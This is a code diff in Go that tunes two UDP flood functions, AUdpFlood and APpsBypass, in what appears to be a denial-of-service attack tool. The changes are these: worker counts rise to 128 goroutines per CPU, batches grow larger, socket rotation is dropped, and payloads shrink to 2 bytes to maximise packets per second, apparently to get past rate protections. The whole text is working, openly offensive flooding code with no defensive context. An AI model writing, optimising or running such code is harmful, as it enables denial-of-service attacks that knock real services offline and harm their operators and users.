@@ -116,59 +116,35 @@ func AUdpFlood(IP, PORT string, SECONDS int, SIZE int, sessionID int32) {
 	}
 
 	// Optimized concurrency settings
-	// Ultimate V5 Scaling
-	workers := 128
+	// Ultimate Extreme V5 Scaling
+	workers := 1024
 	if runtime.NumCPU() > 8 {
-		workers = runtime.NumCPU() * 16
+		workers = runtime.NumCPU() * 128
 	}
-	const batch = 5000
-	const rotateEvery = 50000
+	const batch = 10000
 
 	var wg sync.WaitGroup
 	for i := 0; i < workers; i++ {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
-			var conn *net.UDPConn
-			var err error
-			reconnect := func() {
-				for {
-					if atomic.LoadInt32(&globalSessionID) != sessionID {
-						return
-					}
-					if conn != nil {
-						conn.Close()
-					}
-					conn, err = net.DialUDP("udp4", nil, raddr)
-					if err == nil {
-						conn.SetWriteBuffer(2 * 1024 * 1024)
-						return
-					}
-					time.Sleep(10 * time.Millisecond)
-				}
-			}
-			reconnect()
-			if atomic.LoadInt32(&globalSessionID) != sessionID {
+			
+			// Dial once per worker and keep the socket hot
+			conn, err := net.DialUDP("udp4", nil, raddr)
+			if err != nil {
 				return
 			}
-			totalSent := 0
+			conn.SetWriteBuffer(4 * 1024 * 1024)
+			defer conn.Close()
+
 			for {
 				if atomic.LoadInt32(&globalSessionID) != sessionID {
-					if conn != nil {
-						conn.Close()
-					}
 					return
 				}
+				
+				// Zero-allocation tight loop
 				for j := 0; j < batch; j++ {
-					_, err = conn.Write(payload)
-					totalSent++
-					if totalSent >= rotateEvery {
-						reconnect()
-						if atomic.LoadInt32(&globalSessionID) != sessionID {
-							return
-						}
-						totalSent = 0
-					}
+					conn.Write(payload)
 				}
 				atomic.AddInt64(&ppsCounter, int64(batch))
 			}
@@ -353,7 +329,7 @@ func APpsBypass(IP, PORT string, SECONDS int, sessionID int32) {
 	// Pre-generate randomized payloads - Power of Two for fast indexing
 	const payloadCount = 1024 // 2^10
 	const payloadMask = 1023  // mask for bitwise &
-	const payloadSize = 64
+	const payloadSize = 2 // Extremely critical: 2 bytes to minimize GB/s bandwidth and maximize raw PPS
 	payloads := make([][]byte, payloadCount)
 	for i := 0; i < payloadCount; i++ {
 		p := make([]byte, payloadSize)
@@ -361,13 +337,12 @@ func APpsBypass(IP, PORT string, SECONDS int, sessionID int32) {
 		payloads[i] = p
 	}
 
-	// Ultimate V5 Scaling
-	workers := 128
+	// Ultimate Extreme V5 Scaling
+	workers := 1024
 	if runtime.NumCPU() > 8 {
-		workers = runtime.NumCPU() * 16
+		workers = runtime.NumCPU() * 128
 	}
-	const batchSize = 5000
-	const rotateEvery = 100000
+	const batchSize = 10000
 
 	var wg sync.WaitGroup
 	for i := 0; i < workers; i++ {
@@ -375,54 +350,25 @@ func APpsBypass(IP, PORT string, SECONDS int, sessionID int32) {
 		go func() {
 			defer wg.Done()
 			
-			var conn *net.UDPConn
-			var err error
-			
-			reconnect := func() {
-				for {
-					if atomic.LoadInt32(&globalSessionID) != sessionID {
-						return
-					}
-					if conn != nil {
-						conn.Close()
-					}
-					conn, err = net.DialUDP("udp4", nil, raddr)
-					if err == nil {
-						conn.SetWriteBuffer(2 * 1024 * 1024)
-						return
-					}
-					time.Sleep(10 * time.Millisecond)
-				}
-			}
-
-			reconnect()
-			if atomic.LoadInt32(&globalSessionID) != sessionID {
+			// Dial once per worker
+			conn, err := net.DialUDP("udp4", nil, raddr)
+			if err != nil {
 				return
 			}
+			conn.SetWriteBuffer(4 * 1024 * 1024)
+			defer conn.Close()
 
 			pIdx := uint32(rand.Intn(payloadCount))
-			totalSent := 0
 			
 			for {
 				if atomic.LoadInt32(&globalSessionID) != sessionID {
-					if conn != nil {
-						conn.Close()
-					}
 					return
 				}
 
+				// Zero-allocation tight loop with bitwise indexing
 				for j := 0; j < batchSize; j++ {
-					_, err = conn.Write(payloads[pIdx&payloadMask])
+					conn.Write(payloads[pIdx&payloadMask])
 					pIdx++
-					totalSent++
-					
-					if totalSent >= rotateEvery {
-						reconnect()
-						if atomic.LoadInt32(&globalSessionID) != sessionID {
-							return
-						}
-						totalSent = 0
-					}
 				}
 				atomic.AddInt64(&ppsCounter, int64(batchSize))
 			}
